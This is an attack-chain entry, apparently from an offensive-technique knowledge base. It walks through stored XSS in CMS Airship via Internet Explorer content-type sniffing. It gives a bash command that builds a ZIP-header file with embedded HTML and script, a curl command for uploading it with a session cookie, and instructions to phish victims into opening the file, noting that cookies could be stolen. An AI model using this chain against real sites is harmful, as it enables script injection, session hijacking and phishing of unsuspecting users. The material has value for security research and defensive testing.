---
id: ac-uuid-001
name: Stored XSS via Content-Type Sniffing in CMS Airship File Upload
type: attack_chain
description: >-
  Exploits CMS Airship's lack of security headers on uploaded files to deliver
  stored XSS in Internet Explorer through content-type sniffing.
verified: false
submitted: true
step_count: 3
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:47:12.837Z'
procedures:
  - '[[procedures/Craft-Malicious-ZIP-HTML-File-for-IE-Sniffing]]'
  - '[[procedures/Upload-Malicious-File-to-CMS-Airship]]'
  - '[[procedures/Trick-Victim-into-Accessing-File-in-Internet-Explorer]]'
techniques:
  - '[[JavaScript]]'
  - '[[Remote File Copy]]'
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
tags:
  - xss
  - stored-xss
  - file-upload
  - content-sniffing
  - internet-explorer
platforms:
  - Web
tools:
  - '[[tools/modern.ie]]'
  - '[[tools/CrossSiteContentHijacking]]'
complexity: medium
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Remote File Copy]]'
---

# Stored XSS via Content-Type Sniffing in CMS Airship File Upload

Multi-stage attack chain demonstrating a complete attack workflow exploiting content-type sniffing in CMS Airship to achieve stored XSS in Internet Explorer.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Craft Malicious File] --> B[Upload to CMS]
    B --> C[Victim Access in IE]
    C --> D[XSS Execution]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/modern.ie]]
- [[tools/CrossSiteContentHijacking]]

### Target Environment

- CMS Airship running on PHP web platform
- File upload feature enabled
- No security headers like X-Content-Type-Options: nosniff

### Initial Access Requirements

- Authenticated user account in CMS Airship
- Ability to share URLs with victims using Internet Explorer (e.g., IE 11 on Windows 8.1)
- Network access to upload files and retrieve URLs

## Detailed Attack Procedures

### Step 1: Craft Malicious File
procedure: [[procedures/Craft-Malicious-ZIP-HTML-File-for-IE-Sniffing]]

**Objective**: Create a file that starts with a ZIP header to bypass content-type checks but contains HTML/JavaScript payload that IE will sniff and execute.

**Instructions**: Use a text editor or command-line tool to generate the file. For example, create a file named `xss.zip` with the ZIP header followed by HTML.

Execute [[commands/create-malicious-zip-html]] to craft the file:

```bash
echo -ne 'PK\x03\x04\x14\x00\x06\x00\x08\x08\x00\x00\x00\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00malicious.html\x00\x0a\x20\x20\x20\x20\x3c\x68\x74\x6d\x6c\x3e\x3c\x73\x63\x72\x69\x70\x74\x3e\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29\x3b\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e\x3c\x2f\x68\x74\x6d\x6c\x3e' > xss.zip
```

**Expected Output**: A binary file `xss.zip` that appears as ZIP but executes as HTML in IE.

**Success Indicators**:
- File created without errors
- File size is small (under 1KB)

### Step 2: Upload Malicious File
procedure: [[procedures/Upload-Malicious-File-to-CMS-Airship]]

**Objective**: Upload the crafted file to the CMS as an authenticated user, leveraging the file upload endpoint that serves files without security headers.

**Instructions**: Log in to the CMS Airship admin panel and use the file upload feature. The file will be stored and served via PublicFiles.php without headers like X-Content-Type-Options: nosniff.

Use your browser or [[commands/curl-upload-file]] to simulate upload if API is available:

```bash
curl -X POST -F "file=@xss.zip" -H "Cookie: session=your_session" https://target.com/upload
```

**Expected Output**: Upload success message and a direct URL to the file, e.g., https://target.com/files/xss.zip.

**Success Indicators**:
- File uploaded successfully
- Direct URL accessible and returns the file content

### Step 3: Trick Victim Access
procedure: [[procedures/Trick-Victim-into-Accessing-File-in-Internet-Explorer]]

**Objective**: Socially engineer a victim using Internet Explorer to open the uploaded file URL, triggering content sniffing and XSS execution.

**Instructions**: Share the file URL via email, link, or phishing. When the victim clicks it in IE, the browser sniffs the content as HTML and runs the JavaScript.

Test in a VM using [[tools/modern.ie]] to verify:

No specific command, but monitor network or use browser dev tools to confirm alert pops.

**Expected Output**: JavaScript alert or payload execution in the victim's browser context.

**Success Indicators**:
- Victim's browser executes the script (e.g., alert('XSS'))
- Potential session hijacking if payload steals cookies

## Attack Chain Summary

### Key Achievements

1. Bypassed file type restrictions via ZIP header disguise
2. Exploited missing security headers for content sniffing
3. Achieved stored XSS leading to arbitrary JS execution in IE

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]
- [[Remote File Copy]]

### MITRE ATT&CK Tactics

- [[Execution]]
- [[Collection]]

---
*Last updated: 2023-10-01T00:00:00Z*
